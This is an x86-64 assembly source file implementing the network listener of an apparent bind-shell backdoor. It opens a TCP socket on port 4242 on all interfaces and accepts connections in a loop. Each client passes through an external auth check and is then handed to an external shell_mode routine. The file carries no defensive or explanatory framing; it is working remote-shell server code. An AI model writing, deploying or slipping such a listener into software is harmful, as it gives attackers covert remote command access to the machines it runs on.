BITS 64

section .data
    client_fd   dd 0
    sock_fd     dd 0
    serv:
        family      dw 0
        port        dw 0
        addr        dd 0
        zero        dq 0
        servlen     equ $ - serv
    client:
        cfamily      dw 0
        cport        dw 0
        caddr        dd 0
        czero        dq 0
        clen         dd 0



section .text
    global  create_server
    global  loop_server
    extern  shell_mode
    extern  sleep
    extern  auth

create_server:
    push    rbp
    mov     rbp, rsp
    mov     rdi, 2 ; AF_INET
    mov     rsi, 1 ; SOCK_STREAM
    mov     rdx, 0 ; IP
    mov     rax, 0x29 ; socket
    syscall
    mov     [sock_fd], eax
    mov     edi, [sock_fd]
    mov     rsi, 1
    mov     rdx, 2 ; SO_REUSEADDRESS
    push    1
    lea     r10, [rsp]
    mov     r8, 4
    mov     rax, 0x36 ; setsockopt
    syscall
    mov     [family], WORD 2 ; AF_INET
    mov     [port], DWORD 37392 ; htons(4242);
    mov     DWORD [addr], 0 ; htonl(INADDR_ANY)
    mov     edi, [sock_fd]
    lea     rsi, [rel serv]
    mov     rdx, servlen
    mov     rax, 0x31 ; bind
    syscall
    mov     edi, DWORD [sock_fd]
    mov     rsi, 1
    mov     rax, 0x32 ; listen
    syscall
    leave
    ret

loop_server:
    push    rbp
    mov     rbp, rsp
connect_loop:
    mov     edi, DWORD [sock_fd]
    lea     rsi, [rel client]
    lea     rdx, [rel clen]
    mov     rax, 0x2b ; accept
    syscall
    mov     [client_fd], DWORD eax
    mov     edi, [client_fd]
    call    auth
    cmp     rax, 0
    jne     bye
    mov     edi, [client_fd]
    call    shell_mode
bye:
    mov     edi, [client_fd]
    mov     rax, 0x03 ; close
    syscall
    jmp     connect_loop
    leave
    ret
